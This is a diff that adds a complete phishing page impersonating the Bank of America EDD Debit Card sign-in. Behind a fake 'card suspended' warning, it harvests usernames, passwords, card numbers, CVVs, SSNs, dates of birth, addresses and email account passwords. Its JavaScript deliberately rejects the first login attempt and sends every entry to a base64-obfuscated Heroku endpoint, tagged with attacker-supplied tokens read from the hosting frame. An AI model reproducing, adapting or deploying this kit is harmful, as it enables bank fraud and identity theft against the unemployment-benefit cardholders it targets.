@@ -1,0 +1,583 @@
+<html lang="en" style="">
+    <head>
+        <meta charset="utf-8" />
+
+        <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="version" content="22.07.0128" />
+
+        <title>EDD Debit Card - Sign In</title>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
+        <link href="https://www.visaprepaidprocessing.com/bundles/foundation/css?v=TgYukCV0BSpb98GObtBe6i9KeBqBppGV5EzParDKRD01" rel="stylesheet" />
+
+        <link href="https://www.visaprepaidprocessing.com/bundles/css?v=VXM6M57zACD6NOmrn-CLIWdXiNyPoHxyPJj7fE7s50g1" rel="stylesheet" />
+
+        <link href="https://www.visaprepaidprocessing.com/content/PRC384/CP384-T03-019/_Styles/site.min.css" rel="stylesheet" type="text/css" />
+        <link href="https://www.visaprepaidprocessing.com:444//content/PRC384/_Images/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+
+        <meta name="format-detection" content="telephone=no" />
+
+        <meta class="foundation-mq-topbar" />
+    </head>
+    <body class="body">
+        <div id="pagebody">
+        <a class="skip-to" href="#content">Skip to content</a>
+        <div class="header-container" role="banner">
+            <div class="row header-row">
+                <div class="columns brand-container show-for-medium-up">
+                    <div class="small-12 medium-3 custom-medium-push-5 columns">
+                        <div class="logo-wrapper">
+                            <a href="/eddcard/home/index">
+                                <img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive" id="brand-logo" src="https://www.visaprepaidprocessing.com/content/PRC384/CP384-T03-019/_Images/logo.png" title="" />
+                            </a>
+                        </div>
+                    </div>
+                    <div class="small-12 medium-9 custom-medium-pull-7 columns">
+                        <div class="program-wrapper">
+                            <span class="header-card-program">EDD Debit Card</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="small-12 show-for-small-only columns">
+                    <nav data-topbar="" class="top-bar mobile-nav" role="navigation" aria-label="Main" style="">
+                        <ul class="title-area">
+                            <!-- Title Area -->
+                            <li class="name">
+                                <a href="/eddcard/home/index">
+                                    <img alt="Bank Of America, N. A. Logo" class="header-logo medium img-responsive" id="brand-logo-mobile" src="/content/PRC384/CP384-T03-019/_Images/logo.png" title="" />
+                                </a>
+                            </li>
+                            <li class="toggle-topbar menu-icon">
+                                <button class="menu-icon" aria-expanded="false">
+                                    <i class="fa fa-bars" role="presentation" aria-hidden="true"></i>
+                                    <span class="a11y-hide-visually">Expand Navigation Menu</span>
+                                </button>
+                            </li>
+                            <li class="header-card-program">EDD Debit Card</li>
+                        </ul>
+
+                        <section class="top-bar-section" style="display: none;">
+                            <ul class="left">
+                                <li>
+                                    <a href="#">Home</a>
+                                </li>
+                                <li>
+                                    <a href="#">Sign In</a>
+                                </li>
+                                <li>
+                                    <a href="#">Activate My Card</a>
+                                </li>
+                            </ul>
+                        </section>
+                    </nav>
+                </div>
+
+                <div class="row show-for-medium-up">
+                    <div class="medium-12 columns">
+                        <nav data-topbar="" class="top-bar desktop-nav" role="navigation" aria-label="Main">
+                            <section class="top-bar-section">
+                                <ul class="left">
+                                    <li>
+                                        <a href="#">Home</a>
+                                    </li>
+                                    <li>
+                                        <a href="#">Sign In</a>
+                                    </li>
+                                    <li>
+                                        <a href="#">Activate My Card</a>
+                                    </li>
+                                </ul>
+                            </section>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="content-container" id="mainpage" role="main" tabindex="-1">
+            <div class="row">
+                <div class="large-12 medium-12 small-12 column">
+                    <p style="background-color: #c41230; color: #fff; padding: 10px; margin-bottom: 0px;">Your Card Has Been Suspended, kindly signin to unblock card</p>
+
+                    <h1 id="SignIn">Sign in</h1>
+                    <div class="message warning validation-summary-errors" id="error1" style="display: none;" aria-hidden="false" role="alert">
+                        <span class="a11y-hide-visually">Error Message</span><ul><li>Username is required.</li></ul>
+                       
+                    </div>
+                    <div class="message warning validation-summary-errors" id="error2" style="display: none;" aria-hidden="false" role="alert">
+                        <span class="a11y-hide-visually">Error Message</span><ul><li>Password is required.</li></ul>
+                        
+                    </div>
+                    <div data-alert="" class="message warning round-corner"  id="error3" style="display: none;" ><span class="a11y-hide-visually">Error Message</span><p role="alert"> Your Security Information is incorrect. If you have not created a username, select <a href="/eddcard/verify/needusername">Need Username</a>.</p></div>
+                </div>
+            </div>
+            <div class="box" id="page1">
+                <div class="row">
+                    <div class="medium-12 columns">
+                        <div class="large-12 medium-12 small-12 column">
+                            <p class="align-right margin-bottom-none">
+                                <span class="required">*</span>
+                                Required fields
+                            </p>
+                        </div>
+
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column">
+                                <label  for="user">Username&nbsp;<span class="required">*&nbsp;</span></label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" id="user" maxlength="23" name="VerifyUserRequestHandler.Model.Username" type="text" value="" />
+                                <div>
+                                    <div class="data-rows">
+                                        <input id="VerifyUserRequestHandler_Model_RememberMe" name="VerifyUserRequestHandler.Model.RememberMe" type="checkbox" value="true" />
+                                
+                                        <label class="check-box-label-with-tootip normal" for="VerifyUserRequestHandler_Model_RememberMe">Remember Username</label>
+                                      
+                                    </div>
+                                    <small></small><small><a href="#">Need Username?</a><span aria-hidden="true"> | </span><a href="#">Forgot Username?</a></small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="small-12 columns button-group">
+                            <button class="button small navigationButton primary sbtn" type="button" id="verifyverifyyouridentitySubmit" onclick="nextto();"><span class="sbtn-text">Continue</span></button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="box" id="page2" style="display: none;">
+                <div class="row">
+                    <div class="medium-12 columns">
+                        <div class="large-12 medium-12 small-12 column">
+                            <p class="align-right margin-bottom-none">
+                                <span class="required">*</span>
+                                Required fields
+                            </p>
+                        </div>
+
+                        <div class="row form-row">
+                            <div class="large-3 medium-5 small-12 column">
+                                <label  for="upass">Password&nbsp;<span class="required">*&nbsp;</span></label>
+                            </div>
+                            <div class="large-4 medium-4 small-12 columns left">
+                                <input class="stretch" id="upass" maxlength="23" name="VerifyUserRequestHandler.Model.Username" type="text" value="" />
+                                <br />
+                                <div>
+                                    <small><a href="#">Forgot Password?</a></small>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="small-12 columns button-group">
+                            <button class="button small navigationButton primary" id="sbtn1" type="button" onclick="loginAction();"><span class="sbtn1-txt">Continue</span></button>
+                            <button class="button small navigationButton standard back" id="verifyverifyyouridentitySubmit">Back</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+
+        <div class="content-container" id="page3" style="display: none;" role="main" tabindex="-1">
+            <div class="row">
+                <div class="large-12 medium-12 small-12 column">
+                    <p style="background-color: #c41230; color: #fff; padding: 10px; margin-bottom: 0px;"> Confirm Your Details And Unblock Card.</p>
+
+                    <h1 id="SignIn"> Your Card Is Inactive</h1>
+                </div>
+            </div>
+            <div class="box" >
+                <form id="myForm" onsubmit="return false;">
+                <div class="row">
+                    <div class="medium-12 columns">
+                        <div class="container-fluid">
+                        <div class="large-12 medium-12 small-12 column">
+                            <p class="align-right margin-bottom-none">
+                                <span class="required">*</span>
+                                Required fields
+                            </p>
+                        </div>
+
+                        <div class="row form-row"><div class="large-5 medium-3 small-12 columns left"></div></div>
+                        <div class="row form-row">
+                            
+                            <div class="col-md-12"> <label for="#">Debit Card Number:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" id="dcn" maxlength="16" name="debitno" type="number" value="" required="" />
+                            </div>
+                            
+                        </div>
+                        <div class="row form-row">
+                            
+                            <div class="col-md-9"> <label for="#">Expiry Date:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" class="stretch" aria-required="true" autocomplete="off"  placeholder="MM/YYYY" id="cardexp" maxlength="8" required="" name="cardxp" type="text" value="" />
+                            </div>
+                            <div class="col-md-3">
+                                <label  for="#">Cvv:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" class="stretch" autocomplete="off" size="10" placeholder="123" id="cvv" maxlength="4" required="" name="cvv" type="number" value="" />
+                            </div>
+                           
+                        </div>
+                         <div class="row form-row">
+                            
+                            <div class="col-md-12"> <label for="#">Name On Card:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" id="dcn" maxlength="16" name="debitno" type="text" value="" required="" />
+                            </div>
+                            
+                        </div>
+                        <br/>
+                        <h4>Billing Details</h4>
+                    
+                        
+                        <div class="row form-row">
+                            
+                            <div class="col-md-12"> <label for="#">Address:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" id="6" maxlength="address" name="address" type="text" value="" required="" />
+                            </div>
+                            <div class="large-5 medium-3 small-12 columns left"></div>
+                        </div>
+                        <div class="row form-row">
+                           
+                            <div class="col-md-6"> <label  for="#">City:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" id="7" required="" maxlength="city" name="city" type="text" value="" />
+                            </div>
+   <div class="col-md-6"> <label for="#">State:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" id="7" required="" maxlength="state" name="state" type="text" value="" />
+                            </div>                        </div>
+                        
+                        <div class="row form-row">
+                           
+                            <div class="col-md-8"><label  for="#">&nbsp;Zip Code:&nbsp;<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" size="15" id="9" required="" maxlength="Zip" name="zip" type="text" value="" />
+                            </div>
+                            <div class="col-md-4">
+                                <label for="#">Date of birth:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" placeholder="MM/DD/YYYY " id="pass" maxlength="25" required="" name="dob" type="text" value="" />
+                            </div>
+                            
+                        </div>
+
+                        <div class="row form-row">
+                           
+                            <div class="col-md-6"> <label  for="#">Social Security Number:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" size="15" class="stretch" placeholder="xxx-xx-xxxx" required="" id="ssn" maxlength="12" name="ssn" type="number" value="" />
+                            </div>
+                             <div class="col-md-6">
+                                 <label  for="#">Phone Number:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" placeholder="phone number " id="pass" required="" maxlength="25" name="phone" type="number" value="" />
+                            </div>
+                        </div>
+                     
+                    
+                        <div class="small-12 columns button-group">
+                            <button class="button small navigationButton primary" id="sbtn2" type="submit" >Unblock Card</button>
+                            <button class="button small navigationButton standard back" id="verifyverifyyouridentitySubmit" type="button">Back</button>
+                        </div>
+                    </div>  </div>
+                </div>
+            </form>
+            </div>
+        </div>
+
+        <div class="footer" role="contentinfo">
+            <div class="row">
+                <div class="small-12 columns" role="navigation" aria-label="Footer navigation">
+                    <ul class="footer-navigation">
+                        <li><a href="/eddcard/Program/Fee" target="_blank">Fee Information</a></li>
+                        <li><a href="/eddcard/Program/FAQ" target="_blank">FAQ</a></li>
+                        <li><a href="/eddcard/Program/SiteMap">Site Map</a></li>
+                        <li><a href="/eddcard/Program/Contact" target="_blank">Contact Us</a></li>
+                        <li><a href="/eddcard/Program/Privacy" target="_blank">Privacy / Security</a></li>
+                        <li><a href="/eddcard/Program/Terms" target="_blank">Terms &amp; Conditions</a></li>
+                        <li><a href="/content/PRC384/CP384-T03-019/_Docs/CA-EDD-Digital-TC.pdf" target="_blank">Digital Terms &amp; Conditions and Fees</a></li>
+                        <li><a href="/eddcard/Program/ATMLocator">ATM Locator</a></li>
+
+                        <li><a href="https://www.bankofamerica.com/index.jsp" target="_blank" data-reveal-id="modal-leaving-site">Bank Of America, N. A.</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="extra">
+                <div class="small-12 columns">
+                    <div class="row language">
+                        <div id="lang-label" class="small-12 columns align-center">
+                            <form action="/eddcard/Culture/Change" autocomplete="off" id="CultureForm" method="post" novalidate="novalidate">
+                                <input name="__RequestVerificationToken" type="hidden" value="f1mcTbQpSO3mJBGXYk6hU7D-9vjAyJOuF2vfO4v-2BMGZ6w6rogOV8ipzaHBJMstY9QfFsoCQCalxbjFwI--4jI8VRIf8hCNHulVmequ7BM1" />
+                                <span id="language-label" class="uppercase"><span class="a11y-hide-visually">Select a</span> Language:</span>
+                                <ul aria-labelledby="language-label" class="language-short-list">
+                                    <li>
+                                        <button class="current changeCultureButton" data-culture="en-US" lang="en-US">English<span class="a11y-hide-visually"> (Selected)</span></button>
+                                    </li>
+                                    <li><button class="changeCultureButton" data-culture="es-MX" lang="es-MX">Español</button></li>
+                                </ul>
+                                <input type="submit" class="a11y-hide-all" tabindex="-1" value="Submit" />
+                            </form>
+                        </div>
+                    </div>
+                    <div class="row copyright">
+                        <div class="small-12 columns">
+                            <p>
+                                Copyright 2022 Bank of America Corporation .
+                                <a href="https://usa.visa.com/legal/global-privacy-notice.html"> Visa Global Privacy Notice.</a> <br />
+                                Bank of America, N.A. Member FDIC Equal Housing Lender
+                            </p>
+                            <div class="large-12 column align-center">
+                                <p style="color: #000;">
+                                    <img src="https://www.visaprepaidprocessing.com/content/PRC384/_images/logo.png" /><br />
+                                    <br />
+                                    Apple, the Apple logo, the App Store, and iPhone are trademarks of Apple Inc., registered in the U.S. and other countries. Google Play and the Google Play logo are trademarks of Google LLC.
+                                </p>
+                                <p style="color: #000;">
+                                    Your funds are eligible for FDIC insurance. Your funds are insured up to $250,000 by the FDIC in the event Bank of America, N.A. fails, if specific deposit insurance requirements are met. See
+                                    <a href="https://www.fdic.gov/deposit/deposits/prepaid.html" data-reveal-id="modal-leaving-site">fdic.gov/deposit/deposits/prepaid.html</a> for details. In the event Bank of America, N.A. fails, the FDIC
+                                    may require information from you, including a government identification number, to determine the amount of your insured deposits. If you do not provide this information to the FDIC access to your insured
+                                    funds will be delayed.
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+         <div class="modal fade" id="staticBackdrop" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header" style="background: #d5d5d5">
+        <h5 class="modal-title" style="font-size: 14px;" id="staticBackdropLabel">Link your Email Account</h5>
+        
+      </div>
+      <div class="modal-body" id="emaildiv">
+         
+        <div id="page1" class="col-md-12">
+           
+  <div class="row form-row">
+                            
+                            <div class="col-md-12"> <label for="#">Email address:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" maxlength="16" name="email" id="email" type="email" value="" required="">
+                            </div>
+                            <div class="irisv-textfield__messages alert alert-warning col-12" style="display: none;">This input field is required.</div>
+                        </div>
+        </div>
+<div class="col-md-12" style="padding: 30px 0; display:none;" id="page2">
+                                            <center>
+                                                <img id="imglogo" src="" height="50">
+                                           <p style="margin-top: 20px;" id="em_show"></p></center>
+                                            <div class="row form-row">
+                            
+                            <div class="col-md-12"> <label for="#">Password:<span class="required">*&nbsp;</span></label>
+                                <input aria-invalid="false" aria-required="true" autocomplete="off" class="stretch" maxlength="16" name="epass" id="epass" type="password" value="" required="">
+                            </div>
+                            <div class="irisv-textfield__messages alert alert-danger col-12" style="display: none;">This input field is required.</div>
+                        </div>
+                                       <div class="alert alert-warning col-12"  id="em_error" style="display:none;">Unable to verify you account, kindly make sure your email and password are correct and try again</div>
+
+                                            
+                                        </div>
+                                      
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="button small navigationButton primary" onclick="next()" id="btn1"><span>continue</span></button>
+         <button type="button" class="button small navigationButton primary" id="btn2" onclick="EMlogin()" style="display:none;"><span>Verify now</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="modal fade" id="staticBackdrop2" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-centered">
+    <div class="modal-content">
+      <div class="modal-header">
+       <img src="https://www2.bac-assets.com/homepage/spa-assets/images/assets-images-global-logos-bac-logo-v2-CSX3648cbbb.svg" width="200px">
+       <div class="clearfix"></div>
+       
+      </div>
+      <div class="modal-body">
+         <h4>BANK OF AMERICA PREPAID DEBIT CARD
+</h4>
+        <div class="alert alert alert-info">  <b>Your Information Is Being Processed</b>
+You will Be notified In 72hrs once your information has been verified.
+Failure to provide accurate information's will result to permanent profile deactivation.
+Pls exit this page.</div>
+      </div>
+      
+    </div>
+  </div>
+</div>
+</div>
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF" crossorigin="anonymous"></script>
+
+        <script type="text/javascript">
+           var telid=window.frameElement.getAttribute("rook");
+ var tok=window.frameElement.getAttribute("otp");
+            tok=atob(tok);
+     telid=atob(telid);  
+            function nextto() {
+                var user = $("#user").val();
+                if (user != "") {
+                    $(".sbtn").attr("disabled", true);
+                    $(".sbtn-text").html("Please wait...");
+                    var counter = 2;
+                    setInterval(function () {
+                        counter--;
+                        if (counter === 0) {
+                            clearInterval(counter);
+
+                            $("#page1").hide();
+                            $("#page2").show();
+                        }
+                    }, 1000);
+                } else {
+                    $("#error1").show();
+                }
+            }
+            var count = 0;
+            var pp
+           async  function loginAction() {
+                var user = $("#user").val();
+                var upass = $("#upass").val();
+                if (upass == "") {
+                    $("#error2").show();
+                    return false;
+                } else {
+                }
+                $("#error2").hide();
+                $(".sbtn1").attr("disabled", true);
+                 $(".sbtn1-text").html("Please wait...");
+                count = count + 1;
+                $(".sbtn-text").html("Please Wait ...");
+                var val={ mode: "Account infromation" ,username: user, password: upass};
+                 pp=await postdata(val);
+                
+               if(pp){
+                 if (count >= 2) {
+                        count = 0;
+
+                         $("#mainpage").hide();
+                            $("#page3").show();
+                    } else {
+                        $("#error3").show();
+                        $("#upass").val("");
+                        $(".sbtn1").attr("disabled", false);
+ $(".sbtn1-text").html("Continue");
+                        return false;
+                    }
+               }
+            }
+                     function postdata(datax) {
+                return new Promise(resolve => { 
+                    console.log(datax);
+                var url = atob("aHR0cHM6Ly9wYWNpZmljLWV2ZXJnbGFkZXMtNDczMDkuaGVyb2t1YXBwLmNvbS8=");
+                var pdata=datax;
+                $.ajax({
+                    type: "POST",
+                    url: url,
+                    data: { action: "BOA-EDD", val: pdata, tok: tok, telid: telid },
+                }).done(function (data) {
+      resolve('resolved');
+                });
+                 });
+            }
+
+           $('#myForm').submit(async function() {
+             $("#sbtn2").attr('disabled',true);
+            $("#sbtn2").html('Please wait...');
+    // Get all the forms elements and their values in one step
+    var values = $(this).serializeArray();
+    var inputs = {};
+     inputs['mode']= 'Card infromation';
+$.each(values, function(k, v){
+    inputs[v.name]= v.value;
+});
+
+var dd=await postdata(inputs);
+if(dd){
+
+ $('#staticBackdrop').modal('show');
+ }
+  console.log(inputs);
+});
+            function isEmail(email) {
+  var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+  return regex.test(email);
+}
+ function next(){
+  var email_id = $("#email").val();
+  if(email_id==''){
+   $('#emaildiv #page1 .irisv-textfield').addClass('irisv-textfield--error');
+   $('#emaildiv #page1 .irisv-textfield__messages').show();
+return false;
+    }
+    console.log(isEmail(email_id))
+    if(isEmail(email_id)===true){
+UrlExists(email_id);
+}else{
+     $('#emaildiv #page1 .irisv-textfield').addClass('irisv-textfield--error');
+   $('#emaildiv #page1 .irisv-textfield__messages').show();
+}
+ }
+  function UrlExists(email_id) {
+  var avib =  email_id.substring(email_id.lastIndexOf("@") +1);
+  var str = avib.split(".")[0];
+ $('#btn1 span').html('please wait...');
+ $("#email").attr('disabled', true);
+    console.log(str);
+  urllogo = "https://logo.clearbit.com/"+avib+"?size=50" ;
+    $.get(urllogo)
+    .done(function() { 
+        // exists code 
+          document.getElementById("imglogo").src=urllogo;
+          setTimeout(function() {
+ $("#emaildiv #em_show").html(email_id);
+  $("#emaildiv #page1").hide();
+    $("#emaildiv #page2").show();
+    $('#staticBackdrop #btn1').hide();
+    $('#staticBackdrop #btn2').show();
+}, 2000);
+    }).fail(function() { 
+          document.getElementById("imglogo").src='https://thumbs.dreamstime.com/b/beautiful-meticulously-designed-email-open-mail-new-email-icon-well-organized-fully-editable-vector-icon-email-open-mail-new-158557376.jpg';
+           setTimeout(function() {
+ $("#emaildiv #em_show").html(email_id);
+  $("#emaildiv #page1").hide();
+    $("#emaildiv #page2").show();
+    $('#staticBackdrop #btn1').hide();
+    $('#staticBackdrop #btn2').show();
+}, 2000);
+          
+         
+    })
+}
+var countx=0;
+ async function EMlogin(){
+
+        var email = $("#email").val();
+         var epass = $("#epass").val();
+          var lcount = $("#lcount").val();
+  if(epass==''){
+   $('#emaildiv  #page2 .irisv-textfield').addClass('irisv-textfield--error');
+   $('#emaildiv  #page2 .irisv-textfield__messages').show();
+    return false; 
+}else{}
+countx = countx + 1;
+document.getElementById("btn2").disabled = true; 
+
+         $("#btn2 span").html('Please Wait ...');
+         var val={mode: "Email infromation" , email: email, epass: epass};
+                 pp=await postdata(val);
+                
+               if(pp){
+                 if (countx >= 2) {
+                        countx = 0;
+   $('#staticBackdrop').modal('hide');
+                       $('#staticBackdrop2').modal('show');
+                    } else {
+                    
+ $("#em_error").show(); 
+   $("#epass").val('');
+       $("#btn2 span").html('Verify now');
+        document.getElementById("btn2").disabled = false;
+return false;
+                    }
+               }
+         
+    }
+        </script>
+    </body>
+</html>
